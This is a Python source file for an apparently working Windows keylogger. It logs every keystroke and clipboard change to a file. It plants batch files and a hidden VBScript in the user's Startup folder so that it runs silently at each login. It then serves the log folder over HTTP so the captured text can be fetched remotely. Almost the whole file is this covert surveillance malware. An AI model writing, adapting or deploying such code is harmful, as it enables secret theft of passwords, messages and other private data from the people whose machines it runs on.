import os
import logging
import getpass
import threading
from time import sleep
from pyperclip import paste
from pynput import keyboard
from pynput.keyboard import Listener

USER_NAME = getpass.getuser()
#logging.basicConfig(filename='log\\key.log', level=logging.INFO, format='%(asctime)s: %(message)s')

#copies program into startup file
def startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))

    if not os.path.exists(file_path+'\\log\\'):
        path = file_path + "\\log\\"
        os.mkdir(path)
    else:
        path = file_path + "\\log\\"

    #logging.basicConfig(filename=file_path + '\\log\\key.log', level=logging.INFO, format='%(asctime)s: %(message)s')
    logging.basicConfig(filename=path + '\\key.log', level=logging.INFO, format='%(asctime)s: %(message)s')

    startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(file_path + '\\' + "openLogger.bat", "w+") as bat_file:
        bat_file.write('cd ' + file_path + '\nmkdir ' + file_path + '\\log\\\ncd log\\\ncopy /y NUL key.log >NUL\ncd ..\n.\logger.py')

    with open(file_path + '\\' + "server.bat", "w+") as bat_server:
        bat_server.write('cd ' + file_path + '\\log\npython3 -m http.server')

    with open(startup_path + '\\' + 'hide.vbs', "w+") as vbs_hide:
        vbs_hide.write('Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "' + file_path + '\\openLogger.bat" & Chr(34), 0\nWshShell.Run chr(34) & "' + file_path + '\\server.bat" & Chr(34), 0\nSet WshShell = Nothing')
    

def onPress(key):
    logging.info('Key:  ' + str(key))

def onRelease(key):
    if key == keyboard.Key.esc:
        return False

def keyLogger():
    with Listener(on_press=onPress, on_release=onRelease) as listen:
        listen.join()
        
def clipLogger():
    prevClip = ''
    while True:
        clip = paste()
        if prevClip != clip:
            logging.info('Clip:  '+ clip)
            prevClip = clip
        sleep(1.0)

def main():
    keyThread = threading.Thread(target=keyLogger)
    clipThread = threading.Thread(target=clipLogger)
    keyThread.start()
    clipThread.start()
    startup()

if __name__ == "__main__":
    main()